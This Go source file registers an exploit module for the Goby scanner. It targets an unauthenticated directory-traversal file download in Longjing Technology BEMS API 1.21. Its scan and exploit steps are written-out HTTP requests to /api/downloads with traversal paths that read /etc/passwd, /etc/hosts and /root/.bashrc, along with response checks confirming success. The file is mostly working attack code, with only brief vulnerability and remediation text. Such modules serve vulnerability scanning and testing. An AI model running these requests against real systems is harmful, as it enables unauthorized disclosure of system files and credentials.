package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Longjing Technology BEMS API 1.21 Remote Arbitrary File Download",
  "Description": "The application suffers from an unauthenticated arbitrary file download vulnerability.  Input passed through the fileName parameter through downloads endpoint is not properly verified before being used to download files.  This can be exploited to disclose the contents of arbitrary and sensitive files through directory traversal attacks.",
  "Product": "Battery Energy Management System",
  "Homepage": "http://www.ljkj2012.com",
  "DisclosureDate": "2021-08-01",
  "Author": "luckying1314@139.com",
  "GobyQuery": "server=\"nginx/1.19.1\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">The vulnerability of arbitrary file download or read is mainly caused by the fact that when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter without verifying the validity of the file path. As a result, the attacker can jump through the directory (..&nbsp;</span><span style=\"font-size: 14px;\">&nbsp;\\ or..&nbsp;</span><span style=\"font-size: 14px;\">&nbsp;/) to download or read a file beyond the original specified path.&nbsp;</span><span style=\"font-size: 14px;\">&nbsp;The attacker can finally download or read any files on the system through this vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in sensitive information leakage of the system.&nbsp;&nbsp;</span><br></p>",
  "Recommandation": "<p><span style=\"font-size: 14px;\">Limit ../&nbsp;</span><span style=\"font-size: 14px;\">The best way is that the file should be in the database for one to one mapping, avoid entering the absolute path to obtain the file&nbsp;&nbsp;</span><br></p>",
  "References": [
    "https://www.exploit-db.com/exploits/50163"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "createSelect",
      "value": "../../../etc/passwd,../../../../etc/hosts,../../../../root/.bashrc",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/downloads?fileName=../../../etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/api/downloads?fileName=../../../etc/hosts",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "OR",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "127.0.0.1",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "localhost",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/downloads?fileName={{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "file download"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Battery Energy Management System"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}